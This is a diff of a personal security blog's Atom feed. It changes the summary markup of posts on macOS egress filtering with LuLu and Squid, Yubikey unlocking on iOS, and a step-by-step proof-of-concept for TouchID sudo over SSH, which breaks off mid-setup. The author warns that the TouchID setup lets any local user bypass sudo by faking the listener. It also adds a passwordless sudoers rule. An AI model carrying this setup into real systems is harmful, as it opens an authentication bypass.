@@ -6,98 +6,66 @@
   </author>
   <id>https://m4.rkw.io/blog/</id>
   <title>m4.rkw.io</title>
-  <updated>2022-02-13T16:58:05+00:00</updated>
+  <updated>2022-02-14T11:05:17+00:00</updated>
   <entry>
     <id>http://m4.rkw.io/blog/restricting-macos-egress-with-lulu-and-squid-proxy.html</id>
     <link href="http://m4.rkw.io/blog/restricting-macos-egress-with-lulu-and-squid-proxy.html"/>
-    <summary><pre>Egress filtering is an immensely powerful security control but it&#x27;s not so
+    <summary><p>Egress filtering is an immensely powerful security control but it's not so
 straightforward to do it well. If any malware manages to execute on your system
-one of the first things it&#x27;s likely going to try to do is call home and
+one of the first things it's likely going to try to do is call home and
 establish a C2 channel. With effective egress filtering you can break this link
-in the attack chain and stop it dead in its tracks.
-
-There are two well-known products which do egress filtering on macs - Little
+in the attack chain and stop it dead in its tracks.</p><p>There are two well-known products which do egress filtering on macs - Little
 Snitch and LuLu. LuLu is made available by the awesome Patrick Wardle on his
 website - https://objective-see.com - along with a load of other very clever
-security tools.
-
-This post is mostly going to discuss LuLu but the approach taken here may well
+security tools.</p><p>This post is mostly going to discuss LuLu but the approach taken here may well
 work just as well with Little Snitch. LuLu is free and very cleverly made, it
 even allows you to configure regexes for web urls that applications are allowed
 to connect to. It does have one major limitation imposed by the operating
-system though which is mentioned on the website:
-
-&quot;Due to limitations of macOS, blocking via host name is only applicable to (as
-Apple notes) &quot;Network.framework or NSURLSession connections&quot;. 
-
-As such, for browsers (such as Chrome), that do not leverage these frameworks,
-only ip address based blocking is supported.&quot;
-
-So what this means is that you will often get LuLu popups for connections with
-only IPs specified. This isn&#x27;t ideal because the endpoints being connected to
-will often change IPs so if you simply add rules based on the IPs you&#x27;ll be
+system though which is mentioned on the website:</p><p><pre>"Due to limitations of macOS, blocking via host name is only applicable to (as
+Apple notes) "Network.framework or NSURLSession connections". </pre></p><p>As such, for browsers (such as Chrome), that do not leverage these frameworks,
+only ip address based blocking is supported."</p><p>So what this means is that you will often get LuLu popups for connections with
+only IPs specified. This isn't ideal because the endpoints being connected to
+will often change IPs so if you simply add rules based on the IPs you'll be
 forever plagued with popups whenever they change, and so because of this the
 tendency is to simply allow *:443 or similar to avoid endless popups. This is
-bad because you&#x27;re granting more egress to the application than would
-otherwise be ideal.
-
-There is however a way you can make this a lot letter and that&#x27;s by using an
+bad because you're granting more egress to the application than would
+otherwise be ideal.</p><p>There is however a way you can make this a lot letter and that's by using an
 http proxy to filtering the outbound requests. One such proxy product is Squid
 which is freely available via Homebrew or Macports. If you can force
 applications to connect through squid instead of directly you can have proper
 control over what hosts they can connect to using hostnames even if the
-applications themselves don&#x27;t use the Network or NSURLSession frameworks.
-
-The first thing to determine is what stuff you can force over the proxy. Good
+applications themselves don't use the Network or NSURLSession frameworks.</p><p>The first thing to determine is what stuff you can force over the proxy. Good
 candidates for this are anything that you run from the terminal - curl,
 terraform, python, anything like this can be configured to connect to an http
 proxy. Most terminal apps will respect the environment variables https_proxy or
-HTTPS_PROXY so these can simply be set in your bash config.
-
-Next we need Squid installed via either brew or macports, if you&#x27;re using brew
+HTTPS_PROXY so these can simply be set in your bash config.</p><p>Next we need Squid installed via either brew or macports, if you're using brew
 be aware that it install everything with file ownership as the local user so you
-won&#x27;t want launchd invoking the squid binary as root. Obviously squid will need
-LuLu rules allowing it to make outbound connections, I&#x27;d suggest allowing ports
-80 and 443 outbound to all addresses at a minimum.
-
-Then we want a simple allowlist config for squid:
-
-acl allowlist dstdom_regex &#x27;/etc/squid/allowlist.txt&#x27;
+won't want launchd invoking the squid binary as root. Obviously squid will need
+LuLu rules allowing it to make outbound connections, I'd suggest allowing ports
+80 and 443 outbound to all addresses at a minimum.</p><p>Then we want a simple allowlist config for squid:</p><p><pre>acl allowlist dstdom_regex '/etc/squid/allowlist.txt'
 http_access allow allowlist
 http_access deny all
 dns_v4_first on
-query_icmp off
-
-We can put hostname regexes into allowlist.txt and these will be allowed by the
-proxy.
-
-LuLu won&#x27;t filter any connections to localhost so the ruleset for your
+query_icmp off</pre></p><p>We can put hostname regexes into allowlist.txt and these will be allowed by the
+proxy.</p><p>LuLu won't filter any connections to localhost so the ruleset for your
 applications that can talk to the proxy can be very simple - allow DNS and
 nothing else. I like to create two rules in Lulu for all applications, one to
 allow DNS and one to block all other traffic. Any rules created that allow
 connections will override the default block-everything rule, and this way if a
-connection is denied it&#x27;s simply denied - no annoying popups.
-
-Once this is set up you can simply tail the Squid access log to see what stuff
-is being connected to, anything that isn&#x27;t in the allowlist.txt will return a
-403 and you can edit the list and restart squid if you need to.
-
-It&#x27;s even possible to control access to github using this approach. Github is
+connection is denied it's simply denied - no annoying popups.</p><p>Once this is set up you can simply tail the Squid access log to see what stuff
+is being connected to, anything that isn't in the allowlist.txt will return a
+403 and you can edit the list and restart squid if you need to.</p><p>It's even possible to control access to github using this approach. Github is
 annoying in that its IPs change almost by the second, making filtering
 connections to it with LuLu practically impossible without simply allowing all
 traffic on tcp/22. However using this squid approach and socat we can route all
-ssh connections to github over the proxy:
-
-Host github.com
+ssh connections to github over the proxy:</p><p><pre>Host github.com
   User git
   Port 22
   Hostname github.com
-  ProxyCommand socat - PROXY:localhost:%h:%p,proxyport=3128
-
-Lulu is an excellent product but the limitations of the OS hold it back, by
+  ProxyCommand socat - PROXY:localhost:%h:%p,proxyport=3128</pre></p><p>Lulu is an excellent product but the limitations of the OS hold it back, by
 integrating it with a local http proxy we can get much more control over what
 connections go out of the system.
-</pre></summary>
+</p></summary>
     <title>Restricting macOS egress with LuLu and Squid proxy</title>
     <updated>2022-02-10T20:55:46+00:00</updated>
     <dc:date>2022-02-10T20:55:46+00:00</dc:date>
@@ -105,18 +73,14 @@ connections go out of the system.
   <entry>
     <id>http://m4.rkw.io/blog/restricting-macos-egress-with-lulu-and-squid-proxy.html</id>
     <link href="http://m4.rkw.io/blog/restricting-macos-egress-with-lulu-and-squid-proxy.html"/>
-    <summary><pre>It&#x27;s been a while since I&#x27;ve blogged so I thought I&#x27;d get back into it with some
+    <summary><p>It's been a while since I've blogged so I thought I'd get back into it with some
 security stuff. My dayjob has had a very heavy security focus for the last 3
-years and it&#x27;s infected my personal life too such that I&#x27;m now even more
-obsessed with security than I was before.
-
-I recently wrote a first draft of a Linux server hardening guide:
+years and it's infected my personal life too such that I'm now even more
+obsessed with security than I was before.</p><p>I recently wrote a first draft of a Linux server hardening guide:
 https://github.com/m4rkw/linux-server-hardening-guide and plan to start a
 mini-series soon which will go into some of those topics in further detail with
-example configs etc.
-
-Watch this space!
-</pre></summary>
+example configs etc.</p><p>Watch this space!
+</p></summary>
     <title>Getting back into blogging</title>
     <updated>2022-02-10T05:48:18+00:00</updated>
     <dc:date>2022-02-10T05:48:18+00:00</dc:date>
@@ -124,39 +88,31 @@ Watch this space!
   <entry>
     <id>http://m4.rkw.io/blog/restricting-macos-egress-with-lulu-and-squid-proxy.html</id>
     <link href="http://m4.rkw.io/blog/restricting-macos-egress-with-lulu-and-squid-proxy.html"/>
-    <summary><pre>I love Yubikeys, they provide a very strong second factor for accounts and
+    <summary><p>I love Yubikeys, they provide a very strong second factor for accounts and
 services that you care a lot about. I use them for all kinds of things but one
-thing I was quite excited to try was the Yubikey 5ci in static password mode.
-
-Static password mode simply acts as a virtual keyboard, playing back a static
-sequence of characters over the connected interface (usually USB). I wasn&#x27;t
+thing I was quite excited to try was the Yubikey 5ci in static password mode.</p><p>Static password mode simply acts as a virtual keyboard, playing back a static
+sequence of characters over the connected interface (usually USB). I wasn't
 sure at first if this was supported over the lightning port but it turns out it
-is which is very cool.
-
-Using static password mode to supply the entire password for something is a bad
-idea - if someone steals the key then they have the entire password and there&#x27;s
-no way to protect it on the key. Plug it in, press the sensor and voila you&#x27;ve
+is which is very cool.</p><p>Using static password mode to supply the entire password for something is a bad
+idea - if someone steals the key then they have the entire password and there's
+no way to protect it on the key. Plug it in, press the sensor and voila you've
 got the entire secret string. But using it in combination with a known
 passphrase is very powerful. I was quite excited about the idea of using this on
 iOS - a relatively simple password combined with a huge amount of extra entropy
-from the Yubikey as a salt.
-
-If you&#x27;re going to attempt this, DON&#x27;T do what I did first and set the password
+from the Yubikey as a salt.</p><p>If you're going to attempt this, DON'T do what I did first and set the password
 on the iPhone using the Yubikey. This is a really really bad idea - I did this
 at first and although it appeared to work, the password set correctly, as soon
 as I tried to unlock the phone by typing my passphrase and then activating the
-Yubikey it didn&#x27;t unlock. This was quite unnerving at the time but luckily I had
+Yubikey it didn't unlock. This was quite unnerving at the time but luckily I had
 the secret string emitted by the key noted down and simply typing it in
 carefully got me back into the phone. So learn from my mistake - type the
 password into the iPhone very carefully rather than using the key to set it,
 because if it just happens to fail in the same way twice in that moment you
 might find yourself locked out of your device and facing the prospect of either
 a lot of tedious guesswork (which and how many characters were dropped) or worse
-- restoring from a backup.
-
-At first I thought it was failing to unlock because it was sending the keys
+- restoring from a backup.</p><p>At first I thought it was failing to unlock because it was sending the keys
 too quickly. The Yubikey Personalisation Tool has an option to add up to 60ms
-of delay between the keystrokes and this seemed to help, but it still wasn&#x27;t
+of delay between the keystrokes and this seemed to help, but it still wasn't
 100% reliable. After further testing I eventually determined that the ! prefix
 I was using was being converted into a 1 about 30% of the time. This did not
 seem to happen on the mac so is likely something to do with iOS or the
@@ -165,26 +121,20 @@ character that should be uppercase was occasionally being turned lowercase.
 This glitch only seems to affect the first character of the password and it
 seems to relate to the shift modifier. After disabling both the ! prefix and
 uppercase characters it worked flawlessly every time without any input delay
-necessary.
-
-When it works it&#x27;s really cool - FaceID most of the time and then when I need
+necessary.</p><p>When it works it's really cool - FaceID most of the time and then when I need
 to re-authenticate FaceID I have a much stronger password than before but also
-don&#x27;t need to actually type all of it.
-
-There are a couple of downsides - you have to enable USB access on the lock
-screen or else the key won&#x27;t be able to talk to the phone in order to send the
-keys. This seems like a reasonable trade-off for most people though - if you&#x27;ve
-got someone plugging hardware into your phone to try to break into it you&#x27;ve
+don't need to actually type all of it.</p><p>There are a couple of downsides - you have to enable USB access on the lock
+screen or else the key won't be able to talk to the phone in order to send the
+keys. This seems like a reasonable trade-off for most people though - if you've
+got someone plugging hardware into your phone to try to break into it you've
 likely got much bigger things to worry about. To enable USB access go to
-Settings -&gt; FaceID &amp; Passcode and make sure the &quot;USB Accessories&quot; checkbox is
-enabled. The other downside is that the Apple leather case doesn&#x27;t quite have a
-big enough hole around the lightning socket for the key to insert, but that&#x27;s
-easily solved with a bit of sandpaper.
-
-It&#x27;s a very good idea to have more than one Yubikey. Also make sure you back up
+Settings -> FaceID & Passcode and make sure the "USB Accessories" checkbox is
+enabled. The other downside is that the Apple leather case doesn't quite have a
+big enough hole around the lightning socket for the key to insert, but that's
+easily solved with a bit of sandpaper.</p><p>It's a very good idea to have more than one Yubikey. Also make sure you back up
 the static secret somewhere, I recommend storing it in an encrypted file and
 making several backups, including at least one offline.
-</pre></summary>
+</p></summary>
     <title>Unlocking iOS devices with a Yubikey</title>
     <updated>2021-07-08T20:53:22+00:00</updated>
     <dc:date>2021-07-08T20:53:22+00:00</dc:date>
@@ -192,351 +142,167 @@ making several backups, including at least one offline.
   <entry>
     <id>http://m4.rkw.io/blog/restricting-macos-egress-with-lulu-and-squid-proxy.html</id>
     <link href="http://m4.rkw.io/blog/restricting-macos-egress-with-lulu-and-squid-proxy.html"/>
-    <summary><pre>TouchID on the mac is really cool. It&#x27;s awesome being able to use it for sudo,
+    <summary><p>TouchID on the mac is really cool. It's awesome being able to use it for sudo,
 but I thought it would be even more awesome if it could be used to authenticate
-sudo remotely over ssh.
-
-I&#x27;ve made this work using touch2sudo - https://github.com/prbinu/touch2sudo
+sudo remotely over ssh.</p><p>I've made this work using touch2sudo - https://github.com/prbinu/touch2sudo
 which is a simple binary that when executed will show a touchID authentication
-prompt and return 0 if the auth was successful and non-zero if not.
-
-I&#x27;ve created a simple nginx vhost that exposes a python cgi script. When
+prompt and return 0 if the auth was successful and non-zero if not.</p><p>I've created a simple nginx vhost that exposes a python cgi script. When
 executed this spawns touch2sudo and returns the status code to indicate if
-authentication was successful or not.
-
-I then create a persistent ssh connection to the remote server I want to use
-this with, reverse forwarding the local nginx instance to the remote machine.
-
-Then I wrote a simple PAM module which calls the endpoint in order to initiate
-the touchID authentication.
-
-## warning
-
-Please be aware this is just a proof-of-concept, it&#x27;s very rough around the
-edges and will likely have security issues. Please don&#x27;t use this for systems
-you care about unless you know what you&#x27;re doing. I am not liable for any issues
-that may arise from following these steps.
-
-Also note that when the nginx endpoint isn&#x27;t listening on the remote machine,
-any local user could throw up a tcp listener that just responds with &quot;0&quot; in
-order to bypass sudo authentication. If you want to use this securely you&#x27;ll
-need to do a bit more work.
-
-One possible way to mitigate this might be to use SSL on the nginx endpoint and
-verify the fingerprint of the SSL cert in the touchid shell script wrapper.
-
-## setup
-
-1) Install fcgiwrap from macports
-
-$ sudo port install fcgiwrap
-
-2) Give your local user permission to execute /opt/local/bin/spawn-fcgi as root
-without a password:
-
-/etc/sudoers.d/fcgiwrap
-
---------------
+authentication was successful or not.</p><p>I then create a persistent ssh connection to the remote server I want to use
+this with, reverse forwarding the local nginx instance to the remote machine.</p><p>Then I wrote a simple PAM module which calls the endpoint in order to initiate
+the touchID authentication.</p><p>## warning</p><p>Please be aware this is just a proof-of-concept, it's very rough around the
+edges and will likely have security issues. Please don't use this for systems
+you care about unless you know what you're doing. I am not liable for any issues
+that may arise from following these steps.</p><p>Also note that when the nginx endpoint isn't listening on the remote machine,
+any local user could throw up a tcp listener that just responds with "0" in
+order to bypass sudo authentication. If you want to use this securely you'll
+need to do a bit more work.</p><p>One possible way to mitigate this might be to use SSL on the nginx endpoint and
+verify the fingerprint of the SSL cert in the touchid shell script wrapper.</p><p>## setup</p><p>1) Install fcgiwrap from macports</p><p>$ sudo port install fcgiwrap</p><p>2) Give your local user permission to execute /opt/local/bin/spawn-fcgi as root
+without a password:</p><p><pre>/etc/sudoers.d/fcgiwrap</pre></p><p>--------------
 admin ALL=(ALL) NOPASSWD: /opt/local/bin/spawn-fcgi
---------------
-
-3) Create ~/Library/LaunchAgents/org.macports.fcgiwrap.plist
-
-This has to be in your local user&#x27;s LaunchAgents path as it needs to be able to
-spawn the touchID gui popup on the user&#x27;s desktop.
-
---------------
-&lt;?xml version=&#x27;1.0&#x27; encoding=&#x27;UTF-8&#x27;?&gt;
-&lt;!DOCTYPE plist PUBLIC &quot;-//Apple//DTD PLIST 1.0//EN&quot;
-&quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd&quot; &gt;
-&lt;plist version=&#x27;1.0&#x27;&gt;
-&lt;dict&gt;
-&lt;key&gt;Label&lt;/key&gt;&lt;string&gt;org.macports.fcgiwrap&lt;/string&gt;
-&lt;key&gt;ProgramArguments&lt;/key&gt;
-&lt;array&gt;
-  &lt;string&gt;/usr/bin/sudo&lt;/string&gt;
-  &lt;string&gt;/opt/local/bin/spawn-fcgi&lt;/string&gt;
-  &lt;string&gt;-F&lt;/string&gt;
-  &lt;string&gt;1&lt;/string&gt;
-  &lt;string&gt;-P&lt;/string&gt;
-  &lt;string&gt;/opt/local/var/run/fcgiwrap.pid&lt;/string&gt;
-  &lt;string&gt;-s&lt;/string&gt;
-  &lt;string&gt;/opt/local/var/run/fcgiwrap.socket&lt;/string&gt;
-  &lt;string&gt;-U&lt;/string&gt;
-  &lt;string&gt;nobody&lt;/string&gt;
-  &lt;string&gt;-G&lt;/string&gt;
-  &lt;string&gt;nobody&lt;/string&gt;
-  &lt;string&gt;/opt/local/sbin/fcgiwrap&lt;/string&gt;
-&lt;/array&gt;
-&lt;key&gt;KeepAlive&lt;/key&gt;&lt;true/&gt;
-&lt;/dict&gt;
-&lt;/plist&gt;
---------------
-
-4) Spawn fcgiwrap
-
-$ launchctl load -w ~/Library/LaunchAgents/org.macports.fcgiwrap.plist
-
-5) Install nginx from macports
-
-/opt/local/etc/nginx/nginx.conf
-
---------------
-worker\_processes  1;
-
-events {
+--------------</p><p>3) Create ~/Library/LaunchAgents/org.macports.fcgiwrap.plist</p><p>This has to be in your local user's LaunchAgents path as it needs to be able to
+spawn the touchID gui popup on the user's desktop.</p><p>--------------
+<?xml version='1.0' encoding='UTF-8'?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
+"http://www.apple.com/DTDs/PropertyList-1.0.dtd" >
+<plist version='1.0'>
+<dict>
+<key>Label</key><string>org.macports.fcgiwrap</string>
+<key>ProgramArguments</key>
+<array>
+  <string>/usr/bin/sudo</string>
+  <string>/opt/local/bin/spawn-fcgi</string>
+  <string>-F</string>
+  <string>1</string>
+  <string>-P</string>
+  <string>/opt/local/var/run/fcgiwrap.pid</string>
+  <string>-s</string>
+  <string>/opt/local/var/run/fcgiwrap.socket</string>
+  <string>-U</string>
+  <string>nobody</string>
+  <string>-G</string>
+  <string>nobody</string>
+  <string>/opt/local/sbin/fcgiwrap</string>
+</array>
+<key>KeepAlive</key><true/>
+</dict>
+</plist>
+--------------</p><p>4) Spawn fcgiwrap</p><p>$ launchctl load -w ~/Library/LaunchAgents/org.macports.fcgiwrap.plist</p><p>5) Install nginx from macports</p><p>/opt/local/etc/nginx/nginx.conf</p><p>--------------
+worker\_processes  1;</p><p>events {
     worker_connections  1024;
-}
-
-http {
+}</p><p>http {
     include       mime.types;
-    default_type  application/octet-stream;
-
-    sendfile        on;
-    keepalive_timeout  65;
-
-    include conf.d/*.conf;
-    include sites-enabled/*;
-
-    upstream fcgiwrap {
+    default_type  application/octet-stream;</p><p>    sendfile        on;
+    keepalive_timeout  65;</p><p>    include conf.d/*.conf;
+    include sites-enabled/*;</p><p>    upstream fcgiwrap {
       server unix:/opt/local/var/run/fcgiwrap.socket;
     }
 }
---------------
-
-6) Create /opt/local/etc/nginx/fastcgi_params
-
---------------
+--------------</p><p>6) Create /opt/local/etc/nginx/fastcgi_params</p><p>--------------
 fastcgi_param  QUERY_STRING       $query_string;
 fastcgi_param  REQUEST_METHOD     $request_method;
 fastcgi_param  CONTENT_TYPE       $content_type;
-fastcgi_param  CONTENT_LENGTH     $content_length;
-
-fastcgi_param  SCRIPT_NAME        $fastcgi_script_name;
+fastcgi_param  CONTENT_LENGTH     $content_length;</p><p>fastcgi_param  SCRIPT_NAME        $fastcgi_script_name;
 fastcgi_param  REQUEST_URI        $request_uri;
 fastcgi_param  DOCUMENT_URI       $document_uri;
 fastcgi_param  DOCUMENT_ROOT      $document_root;
 fastcgi_param  SERVER_PROTOCOL    $server_protocol;
 fastcgi_param  REQUEST_SCHEME     $scheme;
-fastcgi_param  HTTPS              $https if_not_empty;
-
-fastcgi_param  GATEWAY_INTERFACE  CGI/1.1;
-fastcgi_param  SERVER_SOFTWARE    nginx/$nginx_version;
-
-fastcgi_param  REMOTE_ADDR        $remote_addr;
+fastcgi_param  HTTPS              $https if_not_empty;</p><p>fastcgi_param  GATEWAY_INTERFACE  CGI/1.1;
+fastcgi_param  SERVER_SOFTWARE    nginx/$nginx_version;</p><p>fastcgi_param  REMOTE_ADDR        $remote_addr;
 fastcgi_param  REMOTE_PORT        $remote_port;
 fastcgi_param  SERVER_ADDR        $server_addr;
 fastcgi_param  SERVER_PORT        $server_port;
 fastcgi_param  SERVER_NAME        $server_name;
---------------
-
-# PHP only, required if PHP was built with --enable-force-cgi-redirect
-fastcgi_param  REDIRECT_STATUS    200;
-
-7) Create the vhost config: /opt/local/etc/nginx/sites-enabled/auth.conf
-
---------------
+--------------</p><p># PHP only, required if PHP was built with --enable-force-cgi-redirect
+fastcgi_param  REDIRECT_STATUS    200;</p><p>7) Create the vhost config: /opt/local/etc/nginx/sites-enabled/auth.conf</p><p>--------------
 server {
-  listen 61111 default_server;
-
-  root /var/www/auth/htdocs;
-  index index.py;
-
-  server_name auth;
-
-  rewrite ^/auth$ /auth.py;
-
-  location ~ \.py$ {
-    include /opt/local/etc/nginx/fastcgi_params;
-
-    fastcgi_param DOCUMENT_ROOT /var/www/auth/htdocs;
-    fastcgi_param SCRIPT_FILENAME /var/www/auth/htdocs$fastcgi_script_name;
-
-    fastcgi_pass fcgiwrap;
+  listen 61111 default_server;</p><p>  root /var/www/auth/htdocs;
+  index index.py;</p><p>  server_name auth;</p><p>  rewrite ^/auth$ /auth.py;</p><p>  location ~ \.py$ {
+    include /opt/local/etc/nginx/fastcgi_params;</p><p>    fastcgi_param DOCUMENT_ROOT /var/www/auth/htdocs;
+    fastcgi_param SCRIPT_FILENAME /var/www/auth/htdocs$fastcgi_script_name;</p><p>    fastcgi_pass fcgiwrap;
     fastcgi_read_timeout 300s;
   }
 }
---------------
-
-8) Start nginx
-
-$ sudo launchctl load -w /Library/LaunchDaemons/org.macports.nginx.plist
-
-9) Grab the touch2sudo binary from here:
-
-https://github.com/prbinu/touch2sudo/releases/download/v0.1/touch2sudo-0.1.tgz
-
-copy it to:
-
-/usr/local/bin/touch2sudo
-
-10) Create the python CGI wrap at /var/www/auth/htdocs/auth.py
-
---------------
-#!/usr/bin/env python3
-
-import os
-import sys
-
-KEY = &#x27;YOUR_KEY_HERE&#x27;
-
-if &#x27;HTTP_AUTH&#x27; not in os.environ or os.environ[&#x27;HTTP_AUTH&#x27;] != KEY:
-  sys.exit(0)
-
-rc = os.system(&quot;/usr/bin/sudo -u admin /usr/local/bin/touch2sudo&quot;)
-
-print(&quot;Content-type: text/plain\n&quot;)
+--------------</p><p>8) Start nginx</p><p>$ sudo launchctl load -w /Library/LaunchDaemons/org.macports.nginx.plist</p><p>9) Grab the touch2sudo binary from here:</p><p><pre>https://github.com/prbinu/touch2sudo/releases/download/v0.1/touch2sudo-0.1.tgz</pre></p><p>copy it to:</p><p><pre>/usr/local/bin/touch2sudo</pre></p><p>10) Create the python CGI wrap at /var/www/auth/htdocs/auth.py</p><p>--------------
+#!/usr/bin/env python3</p><p>import os
+import sys</p><p>KEY = 'YOUR_KEY_HERE'</p><p>if 'HTTP_AUTH' not in os.environ or os.environ['HTTP_AUTH'] != KEY:
+  sys.exit(0)</p><p>rc = os.system("/usr/bin/sudo -u admin /usr/local/bin/touch2sudo")</p><p>print("Content-type: text/plain\n")
 print(str(rc))
---------------
-
-Be sure to replace the key with a random string of your own choosing.
-
-11) Test that the nginx auth endpoint works:
-
-$ curl -s -H &#x27;Auth: YOUR_KEY_HERE&#x27; http://localhost:61111/auth
-
-This should show a touchID prompt, and the output from curl should be 0 if you
-authenticate correctly with touchID. If this doesn&#x27;t work, check the logs and
-see why it isn&#x27;t working before proceeding.
-
-12) Create a new non-admin user on your mac to run the persistent ssh connection
-as. For example you could call the user &quot;sshuser&quot;. If you want to hide them from
-the macOS login window you can execute:
-
-$ sudo dscl . create /Users/sshuser IsHidden 0
-
-If you want to remove them from the FileVault authentication page on startup,
-run this:
-
-$ sudo fdesetup remove -user sshuser
-
-13) Create the same unprivileged user on your remote machine. I&#x27;ll assume you
-used the same username.
-
-14) (Optional) prevent the user on the remote machine from spawning a shell.
+--------------</p><p>Be sure to replace the key with a random string of your own choosing.</p><p>11) Test that the nginx auth endpoint works:</p><p><pre>$ curl -s -H 'Auth: YOUR_KEY_HERE' http://localhost:61111/auth</pre></p><p>This should show a touchID prompt, and the output from curl should be 0 if you
+authenticate correctly with touchID. If this doesn't work, check the logs and
+see why it isn't working before proceeding.</p><p>12) Create a new non-admin user on your mac to run the persistent ssh connection
+as. For example you could call the user "sshuser". If you want to hide them from
+the macOS login window you can execute:</p><p><pre>$ sudo dscl . create /Users/sshuser IsHidden 0</pre></p><p>If you want to remove them from the FileVault authentication page on startup,
+run this:</p><p><pre>$ sudo fdesetup remove -user sshuser</pre></p><p>13) Create the same unprivileged user on your remote machine. I'll assume you
+used the same username.</p><p>14) (Optional) prevent the user on the remote machine from spawning a shell.
 This is for additional security. Add the below lines to your sshd config on the
-remote machine and restart sshd.
-
---------------
+remote machine and restart sshd.</p><p>--------------
 # tail -n3 /etc/ssh/sshd_config
 Match User sshuser
   PermitTTY no
   ForceCommand /bin/true
---------------
-
-15) Become sshuser on your mac and generate an ssh key for them:
-
-$ sudo -Hu sshuser bash
+--------------</p><p>15) Become sshuser on your mac and generate an ssh key for them:</p><p><pre>$ sudo -Hu sshuser bash
 $ cd
-$ ssh-keygen
-
-16) Add the contents of /Users/sshuser/.ssh/id_rsa.pub on your mac to
-/home/sshuser/.ssh/authorized_keys on the remote machine
-
-17) Verify that the key authentication is working from sshuser on the mac to the
-remote machine.
-
-$ sudo -Hu mbssh bash
+$ ssh-keygen</pre></p><p>16) Add the contents of /Users/sshuser/.ssh/id_rsa.pub on your mac to
+/home/sshuser/.ssh/authorized_keys on the remote machine</p><p>17) Verify that the key authentication is working from sshuser on the mac to the
+remote machine.</p><p>$ sudo -Hu mbssh bash
 $ cd
 $ ssh sshuser@REMOTE_MACHINE
 PTY allocation request failed on channel 0
-Connection to REMOTE_MACHINE closed.
-
-If you see &quot;PTY allocation request failed&quot; this means it&#x27;s working.
-
-18) Create a launchd config to launch and maintain the persistent ssh
-connection at: /Library/LaunchDaemons/com.sshuser.ssh.plist
-
---------------
-&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
-&lt;!DOCTYPE plist PUBLIC &quot;-//Apple//DTD PLIST 1.0//EN&quot; &quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd&quot;&gt;
-&lt;plist version=&quot;1.0&quot;&gt;
-&lt;dict&gt;
-    &lt;key&gt;Label&lt;/key&gt;
-    &lt;string&gt;com.sshuser.ssh.plist&lt;/string&gt;
-    &lt;key&gt;ProgramArguments&lt;/key&gt;
-    &lt;array&gt;
-      &lt;string&gt;/usr/bin/ssh&lt;/string&gt;
-      &lt;string&gt;-NT&lt;/string&gt;
-      &lt;string&gt;-o ServerAliveInterval=60&lt;/string&gt;
-      &lt;string&gt;-o ExitOnForwardFailure=yes&lt;/string&gt;
-      &lt;string&gt;-i&lt;/string&gt;
-      &lt;string&gt;/Users/sshuser/.ssh/id_rsa&lt;/string&gt;
-      &lt;string&gt;-R 61111:localhost:61111&lt;/string&gt;
-      &lt;string&gt;sshuser@REMOTE_MACHINE&lt;/string&gt;
-    &lt;/array&gt;
-    &lt;key&gt;RunAtLoad&lt;/key&gt;
-    &lt;true/&gt;
-    &lt;key&gt;KeepAlive&lt;/key&gt;
-    &lt;true/&gt;
-    &lt;key&gt;UserName&lt;/key&gt;
-    &lt;string&gt;sshuser&lt;/string&gt;
-&lt;/dict&gt;
-&lt;/plist&gt;
---------------
-
-19) Start the launch service:
-
-$ sudo launchctl load -w /Library/LaunchDaemons/com.sshuser.ssh.plist
-
-20) Test that the touchID prompt comes up when you hit the nginx endpoint from
-the remote server:
-
-$ ssh REMOTE_SERVER
-$ curl -sH &#x27;Auth: YOUR_KEY_HERE&#x27; http://localhost:61111/auth
-
-You should get a touchID prompt on your mac. If not, investigate and resolve the
-issue before proceeding.
-
-21) Create a simple bash wrapper to invoke the touchid authentication:
-
-/usr/local/bin/touchid
-
---------------
+Connection to REMOTE_MACHINE closed.</p><p>If you see "PTY allocation request failed" this means it's working.</p><p>18) Create a launchd config to launch and maintain the persistent ssh
+connection at: /Library/LaunchDaemons/com.sshuser.ssh.plist</p><p>--------------
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+    <key>Label</key>
+    <string>com.sshuser.ssh.plist</string>
+    <key>ProgramArguments</key>
+    <array>
+      <string>/usr/bin/ssh</string>
+      <string>-NT</string>
+      <string>-o ServerAliveInterval=60</string>
+      <string>-o ExitOnForwardFailure=yes</string>
+      <string>-i</string>
+      <string>/Users/sshuser/.ssh/id_rsa</string>
+      <string>-R 61111:localhost:61111</string>
+      <string>sshuser@REMOTE_MACHINE</string>
+    </array>
+    <key>RunAtLoad</key>
+    <true/>
+    <key>KeepAlive</key>
+    <true/>
+    <key>UserName</key>
+    <string>sshuser</string>
+</dict>
+</plist>
+--------------</p><p>19) Start the launch service:</p><p><pre>$ sudo launchctl load -w /Library/LaunchDaemons/com.sshuser.ssh.plist</pre></p><p>20) Test that the touchID prompt comes up when you hit the nginx endpoint from
+the remote server:</p><p><pre>$ ssh REMOTE_SERVER
+$ curl -sH 'Auth: YOUR_KEY_HERE' http://localhost:61111/auth</pre></p><p>You should get a touchID prompt on your mac. If not, investigate and resolve the
+issue before proceeding.</p><p>21) Create a simple bash wrapper to invoke the touchid authentication:</p><p><pre>/usr/local/bin/touchid</pre></p><p>--------------
 #!/bin/bash
-/bin/netstat -nat |grep &#x27;:61111&#x27; 1&gt;/dev/null
+/bin/netstat -nat |grep ':61111' 1>/dev/null
 if [ $? -eq 0 ] ; then
-  r=`/usr/bin/curl -s -H &#x27;Auth: YOUR_KEY_HERE&#x27; http://localhost:61111/auth`
-  if [ &quot;$r&quot; == &quot;0&quot; ] ; then
+  r=`/usr/bin/curl -s -H 'Auth: YOUR_KEY_HERE' http://localhost:61111/auth`
+  if [ "$r" == "0" ] ; then
     exit 0
   else
     exit 1
   fi
 fi
 exit 1
---------------
-
-This wrapper will first check that the :61111 socket is listening, if it isn&#x27;t
+--------------</p><p>This wrapper will first check that the :61111 socket is listening, if it isn't
 there it will return a non-zero exit code allowing sudo to fall back to password
-authentication.
-
-Test that this works before proceeding.
-
-22) Clone my fork of simple-pam: https://github.com/m4rkw/simple-pam
-
-$ git clone https://github.com/m4rkw/simple-pam
-
-23) Compile and install the pam module
-
-$ sudo apt install libpam-dev
